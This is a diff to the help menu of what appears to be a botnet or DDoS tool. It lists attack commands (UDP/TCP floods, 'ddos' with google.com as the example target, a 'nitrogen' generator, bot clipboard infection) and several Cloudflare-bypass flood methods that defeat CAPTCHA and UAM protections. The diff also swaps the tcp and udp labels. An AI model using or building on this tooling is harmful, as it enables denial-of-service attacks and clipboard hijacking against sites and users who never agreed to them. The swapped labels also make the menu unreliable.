@@ -2,8 +2,8 @@
                                                 ╔═════════════════════╗
                                                 ║       COMMAND       ║
           ╔═════════════════════════════════════╩═════════════════════╩════════════════════════════════════╗
-          ║     attack udp <ip> <port> <time> <thread>     ║     attack udp 127.0.0.1 80 60 100            ║
-          ║     ddos <method> <ip> <thread> <time>         ║     ddos cfb https://google.com 10 5          ║
+          ║     attack <method> <ip> <port> <t> <thread>   ║     attack udp 127.0.0.1 80 60 100            ║
+          ║     ddos <method> <url> <thread> <t>           ║     ddos cfb https://google.com 10 5          ║
           ║     nitrogen <amount>                          ║     nitrogen 100                              ║
           ║     infectclipboard <botName> <url>            ║     Admin privileges required                 ║
           ║     stopinfectclipboard <botName>              ║     Admin privileges required                 ║  
@@ -37,9 +37,16 @@
 	  
 	  
                                                 ╔═════════════════════╗
-                                                ║       METHODS       ║
+                                                ║         I.P         ║
                           ╔═════════════════════╩═════════════════════╩════════════════════╗
-                          ║    cfb             ║   Bypass CF Attack                        ║
+			  ║    tcp             ║   UDP Attack                              ║
+                          ║    udp             ║   TCP Attack                              ║
+                          ╚════════════════════════════════════════════════════════════════╝
+                          
+                                                ╔═════════════════════╗
+                                                ║       WEBSITE       ║
+                          ╔═════════════════════╩═════════════════════╩════════════════════╗
+			  ║    cfb             ║   Bypass CF Attack                        ║
                           ║    pxcfb           ║   Bypass CF Attack With Proxy             ║
                           ║    cfreq           ║   Bypass CF UAM, CAPTCHA, BFM (request)   ║
                           ║    cfsoc           ║   Bypass CF UAM, CAPTCHA, BFM (socket)    ║
